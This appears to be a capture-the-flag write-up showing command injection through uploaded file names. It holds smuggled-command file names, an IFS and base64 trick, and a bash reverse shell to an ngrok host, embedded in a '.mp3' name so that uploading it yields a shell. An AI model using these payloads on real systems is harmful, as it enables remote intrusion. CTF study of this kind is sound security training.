```
C:\home\radha\Desktop\ctf> ls
'file1";id'
                                                                                                                                                                      
C:\home\radha\Desktop\ctf> 


```
![image](https://github.com/m0wn1ka/ctf/assets/127676379/e2bc4435-8606-4bae-a61b-1ac9bae92f51)
- can take help of this https://hackmd.io/@dnny/rycRxP99n
```
C:\home\radha\Desktop\ctf\part2> touch 'abc$(sleep${IFS}13).txt'
                                                                                                                                                                      
C:\home\radha\Desktop\ctf\part2> ls
'abc$(sleep${IFS}13).txt'
                                                                                                                                                                      
C:\home\radha\Desktop\ctf\part2> 
```
this does make the output come slowy





$(echo${IFS}'bHMK'|base64${IFS}-d|bash).txt
```
C:\home\radha\Desktop\ctf\part2\web> echo 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/18309 0>&1'|base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xODMwOSAwPiYxCg==
                                                                                                                                                                      
C:\home\radha\Desktop\ctf\part2\web> echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xODMwOSAwPiYxCg'|base64 -d
bash -i >& /dev/tcp/0.tcp.in.ngrok.io/18309 0>&1
base64: invalid input
                                                                                                                                                                      
C:\home\radha\Desktop\ctf\part2\web> echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xODMwOSAwPiYxCg=='|base64 -d
bash -i >& /dev/tcp/0.tcp.in.ngrok.io/18309 0>&1
                                                                                                                                                                      
C:\home\radha\Desktop\ctf\part2\web> 

```
- started  a ngrok server at 1332
![image](https://github.com/m0wn1ka/ctf/assets/127676379/92c172a5-ff8e-43e1-9aed-48eab588f7e2)
- started a netcat listenr at 1332
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/36d77912-326b-40fd-91ad-0d13219952e6)
```
C:\home\radha\Desktop\ctf\part2\web> echo 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/18309 0>&1'|base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xODMwOSAwPiYxCg==
C:\home\radha\Desktop\ctf\part2> touch 'efg$(echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xODMwOSAwPiYxCg=="|base64${IFS}-d|bash).mp3'
```
- uploading this file will give a reverse shell
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/40f709e9-9e9d-4a6b-9474-cccf43f09052)
 ![image](https://github.com/m0wn1ka/ctf/assets/127676379/456a8306-b9bc-45e1-a093-c8d3200946ad)

 
ENV flag="0CTF{Congratulations_for_finding_the_flag}"



